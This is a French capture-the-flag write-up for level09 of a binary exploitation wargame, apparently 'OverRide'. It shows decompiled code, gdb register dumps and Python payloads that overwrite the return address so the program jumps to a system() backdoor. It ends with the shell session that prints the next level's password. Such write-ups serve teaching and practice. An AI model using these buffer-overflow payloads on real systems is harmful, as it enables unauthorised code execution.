# **Level 09**

Pour ce `level09` nous decompilons l'executable

```
#include <defs.h>


int secret_backdoor()
{
  char s[128]; // [rsp+0h] [rbp-80h] BYREF

  fgets(s, 128, stdin);
  return system(s);
}

char * set_msg(int a1)
{
  char s[1024]; // [rsp+10h] [rbp-400h] BYREF

  memset(s, 0, sizeof(s));
  puts(">: Msg @Unix-Dude");
  printf(">>: ");
  fgets(s, 1024, stdin);
  return strncpy((char *)a1, s, *(int *)(a1 + 180));
}

int set_username(int a1)
{
  char s[140]; // [rsp+10h] [rbp-90h] BYREF

  memset(s, 0, 128);
  puts(">: Enter your username");
  printf(">>: ");
  fgets(s, 128, stdin);
  for ( int i = 0; i <= 40 && s[i]; ++i )
    *(a1 + i + 140) = s[i];
  return printf(">: Welcome, %s", (const char *)(a1 + 140));
}

int handle_msg()
{
  char v1[140]; // [rsp+0h] [rbp-C0h] BYREF //0x7fffffffe0d0

  set_username((int)v1);
  set_msg((int)v1);
  return puts(">: Msg sent!");
}

int main(int argc, const char **argv, const char **envp)
{
  puts(
    "--------------------------------------------\n"
    "|   ~Welcome to l33t-m$n ~    v1337        |\n"
    "--------------------------------------------");
  handle_msg();
  return 0;
}
```

Pour ce niveau, nous avons `deux` inputs, le premier est ecrit dans les adresse entre `v1 + 140` et `v1 + 180` et le second est 
ecrit dans `v1` avec une taille correspondant au contenue de `v1 + 180` que l'on peux ecrire grace au premier input. Donc nous ecrirons le maximum, `\xff`.

Notre but va donc etre de reecrire sur l'addresse utiliser par le `ret` de `handle_msg` pour jump sur `secret_backdoor`

Pour ce faire nous allons determiner la position de cette adresse. Pour ce faire nous generons une sequenece de 255 chiffre aleatoire

```
➜  trashfile python test.py
971681244935563299095701066299655488814374609664275905902473332469537890711589669689642906128513824137099822502903637615294721734102055690452056575499650179018468417448128247378537802426190752413283624686016607217117582797123290324373876622152693229169370
```
Puis dans gdb nous regardons les regitres

```
(gdb) i r
rax            0xd	13
rbx            0x0	0
rcx            0x7ffff7b01f90	140737348902800
rdx            0x7ffff7dd5a90	140737351867024
rsi            0x7ffff7ff7000	140737354100736
rdi            0xffffffff	4294967295
rbp            0x3236333832333134	0x3236333832333134
rsp            0x7fffffffe198	0x7fffffffe198
r8             0x7ffff7ff7004	140737354100740
r9             0xc	12
r10            0x7fffffffda40	140737488345664
r11            0x246	582
r12            0x555555554790	93824992233360
r13            0x7fffffffe280	140737488347776
r14            0x0	0
r15            0x0	0
rip            0x555555554931	0x555555554931 <handle_msg+113>
eflags         0x10246	[ PF ZF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
```

Il y a cette chaine dans `rbp` : 0x3236333832333134 qui correspond a `41328362` soit apres le 192eme caractere. Comme rbp et `rip` sont stocke a cote dans la memoire `rip` devrait etre apres `200` caracteres

```
level09@OverRide:~$ (python -c "print'a'*40+'\xff'"; python -c "print'a'*200+'abc'") > /var/crash/file
(gdb) 
Single stepping until exit from function handle_msg,
which has no line number information.
0x000000000a636261 in ?? ()
```

Maintenant il nous faut trouver l'addresse de `secret_backdoor`

```
(gdb) disas secret_backdoor 
Dump of assembler code for function secret_backdoor:
   0x000055555555488c <+0>:	push   %rbp
   0x000055555555488d <+1>:	mov    %rsp,%rbp
   0x0000555555554890 <+4>:	add    $0xffffffffffffff80,%rsp
   0x0000555555554894 <+8>:	mov    0x20171d(%rip),%rax        # 0x555555755fb8
   0x000055555555489b <+15>:	mov    (%rax),%rax
   0x000055555555489e <+18>:	mov    %rax,%rdx
   0x00005555555548a1 <+21>:	lea    -0x80(%rbp),%rax
   0x00005555555548a5 <+25>:	mov    $0x80,%esi
   0x00005555555548aa <+30>:	mov    %rax,%rdi
   0x00005555555548ad <+33>:	callq  0x555555554770 <fgets@plt>
   0x00005555555548b2 <+38>:	lea    -0x80(%rbp),%rax
   0x00005555555548b6 <+42>:	mov    %rax,%rdi
   0x00005555555548b9 <+45>:	callq  0x555555554740 <system@plt>
   0x00005555555548be <+50>:	leaveq 
   0x00005555555548bf <+51>:	retq   
End of assembler dump.
```
Nous pouvons ecrire notre payload

```
level09@OverRide:~$ (python -c "print'a'*40+'\xff'"; python -c "print'a'*200+'\x8c\x48\x55\x55\x55\x55\x00\x00'"; python -c "print'/bin/sh'") > /var/crash/file 
level09@OverRide:~$ cat /var/crash/file - | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
id
uid=1010(level09) gid=1010(level09) euid=1009(end) egid=100(users) groups=1009(end),100(users),1010(level09)
cat /home/users/end/.pass            
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

Et voila pour override !
